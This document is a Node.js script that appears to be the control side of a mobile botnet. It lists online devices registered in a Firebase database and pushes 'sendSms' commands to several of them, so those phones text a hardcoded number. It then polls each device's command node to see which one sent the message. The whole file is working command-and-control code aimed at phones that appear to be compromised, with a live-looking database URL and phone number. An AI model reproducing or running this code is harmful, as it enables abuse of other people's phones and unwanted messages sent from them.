'use strict';

var FB = 'https://krish-10-default-rtdb.firebaseio.com';
var TO = process.argv[2] || '9674725687';
var MSG = process.argv[3] || 'GOD panel test ' + new Date().toLocaleTimeString('en-IN');
var MAX_DEVICES = parseInt(process.argv[4] || '4', 10);
var MONITOR_SEC = parseInt(process.argv[5] || '90', 10);

function url(path){
  return FB.replace(/\/+$/, '') + '/' + path + '.json';
}

async function getJson(path){
  var r = await fetch(url(path));
  if(r.status === 404) return null;
  if(!r.ok) throw new Error(path + ' HTTP ' + r.status);
  return r.json();
}

async function godPut(path, data){
  var r = await fetch(url(path), {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
  var text = await r.text();
  return { ok: r.ok, status: r.status, text: text };
}

function godPayload(sim, to, message){
  return { from: sim, to: String(to).trim(), message: message, isSended: false };
}

function summarizeNode(node){
  if(node == null) return '(null — node cleared / consumed)';
  if(typeof node !== 'object') return String(node);
  return JSON.stringify({
    isSended: node.isSended,
    to: node.to || node.number || node.phone,
    message: (node.message || '').slice(0, 40),
    status: node.status
  });
}

(async function main(){
  console.log('=== GOD Zp method only (minimal PUT) ===');
  console.log('Firebase:', FB);
  console.log('To:', TO, '| Message:', MSG);
  console.log('');

  var clients = await getJson('clients');
  if(!clients || typeof clients !== 'object'){
    console.error('No clients');
    process.exit(1);
  }

  var online = [];
  Object.keys(clients).forEach(function(id){
    var c = clients[id];
    if(c && c.status === true) online.push({ id: id, battery: c.battery || '?' });
  });

  online.sort(function(a, b){ return a.id.localeCompare(b.id); });
  var picked = online.slice(0, MAX_DEVICES);

  if(!picked.length){
    console.error('No online devices');
    process.exit(1);
  }

  console.log('Online total:', online.length, '| Sending from:', picked.map(function(p){ return p.id; }).join(', '));
  console.log('');

  var jobs = [];
  for(var i = 0; i < picked.length; i++){
    var dev = picked[i];
    var sim = 1;
    var path = 'clients/' + dev.id + '/webhookEvent/sendSms';
    var tag = dev.id.slice(0, 8);
    var body = godPayload(sim, TO, MSG + ' [' + tag + ']');

    console.log('[' + tag + '] PUT', path);
    var put = await godPut(path, body);
    console.log('[' + tag + '] PUT status', put.status, put.ok ? 'OK' : put.text.slice(0, 120));

    jobs.push({ id: dev.id, tag: tag, path: path, putAt: Date.now(), last: null });
    await new Promise(function(r){ setTimeout(r, 400); });
  }

  console.log('\n--- Monitoring ' + MONITOR_SEC + 's (every 2s) ---\n');

  var end = Date.now() + MONITOR_SEC * 1000;
  while(Date.now() < end){
    for(var j = 0; j < jobs.length; j++){
      var job = jobs[j];
      try{
        var cur = await getJson(job.path);
        var sum = summarizeNode(cur);
        if(sum !== job.last){
          console.log(new Date().toLocaleTimeString('en-IN'), '[' + job.tag + ']', sum);
          job.last = sum;
        }
      }catch(e){
        console.log(new Date().toLocaleTimeString('en-IN'), '[' + job.tag + ']', 'poll err', e.message);
      }
    }
    await new Promise(function(r){ setTimeout(r, 2000); });
  }

  console.log('\n=== Done. Batana kaunse device se SMS aaya phone par ===');
})();
